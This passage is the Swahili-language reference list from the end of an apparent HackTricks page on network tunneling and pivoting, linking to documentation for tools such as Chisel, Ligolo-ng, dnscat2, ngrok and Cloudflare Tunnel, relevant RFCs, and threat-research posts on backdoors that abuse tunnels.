- [15] [README ya reGeorg](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [README ya Chisel](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Mwongozo wa Kuanza Haraka wa Ligolo-ng](https://docs.ligolo.ng/Quickstart/)
- [18] [Listeners za Ligolo-ng](https://docs.ligolo.ng/Listeners/)
- [19] [Localhost ya Ligolo-ng](https://docs.ligolo.ng/Localhost/)
- [20] [README ya rpivot](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Mwongozo wa socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Mwongozo wa PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Chaguo za mstari wa amri za PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Amri ya Microsoft netsh interface portproxy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [README ya SocksOverRDP](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Nyaraka za Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Sheria za Proxification za Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Mwongozo wa OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [README ya YARP](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [README ya iodine](https://code.kryo.se/iodine/README.html)
- [32] [README ya dnscat2](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [README ya dnscat2-powershell](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [README ya proxychains-ng](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Majina ya Vikoa - Utekelezaji na Vipimo](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [README ya ptunnel-ng](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [CLI ya Agent ya ngrok](https://ngrok.com/docs/agent/cli)
- [40] [Kiolesura cha Ukaguzi wa Wavuti cha ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [Virtual hosts za ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [Usanidi wa Agent ya ngrok v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Muhtasari wa Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Vigezo vya origin vya Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Usanidi wa Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Faili ya usanidi wa Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Vigezo vya uendeshaji wa Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [Dhana za frp](https://gofrp.org/en/docs/concepts/)
- [49] [XTCP ya frp](https://gofrp.org/en/docs/features/xtcp/)
- [50] [Lango la SSH Tunnel la frp](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Nyaraka za mitandao ya QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [README ya wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [Hazina ya msimbo wa NetSPI BOFScale](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: Tailnet Inayopitishwa kupitia CDN kutoka BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Amri za CLI za Dev Tunnels](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [APT ya NightEagle: GhostContainer na Tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
- [59] [FortiGuard Labs - ClingSTUN: Backdoor ya Linux Inatumia Miundombinu ya Umma ya STUN Vibaya](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
- [60] [RFC 8489 - Huduma za Session Traversal za NAT (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 - Mahitaji ya Tabia ya NAT kwa Unicast UDP](https://www.rfc-editor.org/rfc/rfc4787.html)
- [62] [README ya Tailcat](https://github.com/tailscale/tailcat/blob/main/README.md)
- [63] [Malwarebytes - Malware ya Kothamine Inatumia tailcat ya Tailscale Kukwepa Ugunduzi wa Mtandao](https://www.malwarebytes.com/blog/threat-intel/2026/09/kothamine-malware-uses-tailscales-tailcat-to-evade-network-detection)
- [64] [README ya Yggstack](https://github.com/yggdrasil-network/yggstack)
- [65] [Usanidi wa Yggdrasil: Kuunganisha kwa peers](https://yggdrasil-network.github.io/configuration.html)
- [66] [Maswali Yanayoulizwa Mara kwa Mara ya Yggdrasil: Kutotambulika na Peering](https://yggdrasil-network.github.io/faq.html)
- [67] [ESET Research: Backdoor ya MythicRatatoskr inayowezeshwa na Yggdrasil](https://www.welivesecurity.com/en/eset-research/mythicratatoskr-yggdrasil-enabled-backdoor-deployed-uac0099-sandworm-collaboration)
{{#include ../banners/hacktricks-training.md}}
